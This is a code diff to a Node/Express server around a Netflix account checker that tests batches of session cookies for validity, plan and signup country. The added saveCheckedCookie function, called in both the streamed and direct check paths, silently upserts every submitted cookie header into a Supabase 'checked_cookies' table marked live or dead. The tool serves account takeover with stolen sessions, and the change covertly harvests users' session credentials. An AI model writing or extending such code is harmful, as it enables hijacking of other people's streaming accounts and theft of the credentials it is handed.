@@ -3,6 +3,7 @@ const cors = require("cors");
 const fs = require('fs');
 const path = require('path');
 const NetflixAccountChecker = require('./main.js');
+const { createClient } = require('@supabase/supabase-js');
 
 const app = express();
 const COOKIE_META_KEYS = new Set([
@@ -35,6 +36,11 @@ const DEFAULT_WORKER_COUNT = 1;
 const MIN_WORKER_COUNT = 1;
 const MAX_WORKER_COUNT = 10;
 const PORT = process.env.PORT || 3001;
+
+const supabase = createClient(
+  process.env.SUPABASE_URL,
+  process.env.SUPABASE_SERVICE_ROLE_KEY
+);
 
 function toCookiePair(name, value) {
   const cookieName = String(name ?? '').trim();
@@ -615,10 +621,13 @@ async function runStreamedCheck(req, res, cookies, workerCount, checkOptions = {
 
         const resultWithCookie = sanitizeCheckerResultForClient(result, cookie);
 
-        if (resultWithCookie.valid) {
-          valid += 1;
-        }
-        processed += 1;
+// 🔥 SAVE TO SUPABASE
+await saveCheckedCookie(resultWithCookie, cookie);
+
+if (resultWithCookie.valid) {
+  valid += 1;
+}
+processed += 1;
 
         send('result', {
           index,
@@ -661,6 +670,26 @@ async function runStreamedCheck(req, res, cookies, workerCount, checkOptions = {
   }
 }
 
+async function saveCheckedCookie(result, cookieHeader) {
+  try {
+    await supabase
+      .from('checked_cookies')
+      .upsert(
+        {
+          cookie_header: normalizeCookieHeaderCandidate(cookieHeader) || null,
+          plan: normalizeTextField(result?.plan) || null,
+          country: normalizeTextField(result?.countryOfSignup) || null,
+          is_live: result?.valid === true,
+          status: result?.valid === true ? 'live' : 'dead',
+          checked_at: new Date().toISOString(),
+        },
+        { onConflict: 'cookie_header' }
+      );
+  } catch (error) {
+    console.error('Supabase save error:', error);
+  }
+}
+
 async function runDirectCheck(cookies, workerCount, checkOptions = {}) {
   const checker = new NetflixAccountChecker();
   const results = new Array(cookies.length);
@@ -685,7 +714,11 @@ async function runDirectCheck(cookies, workerCount, checkOptions = {}) {
           result = { valid: false, reason };
         }
 
-        results[index] = sanitizeCheckerResultForClient(result, cookie);
+        const resultWithCookie = sanitizeCheckerResultForClient(result, cookie);
+results[index] = resultWithCookie;
+
+// 🔥 SAVE TO SUPABASE
+await saveCheckedCookie(resultWithCookie, cookie);
       }
     })
   );
